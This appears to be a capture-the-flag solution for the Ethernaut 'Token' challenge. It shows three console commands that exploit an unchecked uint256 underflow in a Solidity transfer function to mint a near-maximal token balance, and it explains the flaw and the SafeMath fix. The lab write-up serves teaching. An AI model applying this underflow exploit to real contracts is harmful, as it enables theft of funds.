Solution
========

1. Get balance: (await contract.balanceOf(player)).toString() --> 20
2. create a 2nd account in metamask --> 2ndAccountAddress
3. await contract.transfer("2ndAccountAddress", 21)

Expalanations
=============

In step 3 we transfer more tokens to the secondary account than we own.
Here is the relevant code of the transfer function of the Token contract:
```
require(balances[msg.sender] - _value >= 0);
balances[msg.sender] -= _value;
balances[_to] += _value;
```

line 1: The security check fails since the transfer value exceeds the balance of the primary account causing an uint256 underflow
--> balance - value = max value of uint256 (115792089237316195423570985008687907853269984665640564039457584007913129639935, in solidity: type(uint256).max or 2**256 - 1)

line 2: the same underflow gives the primary account a balance of 2**256 - 1 tokens

line 3: the secondary account receives 21 tokens.

--> SOLVED

Conclusion
==========

Use OpenZeppelin's SafeMath library that automatically checks for overflows in all the mathematical operators.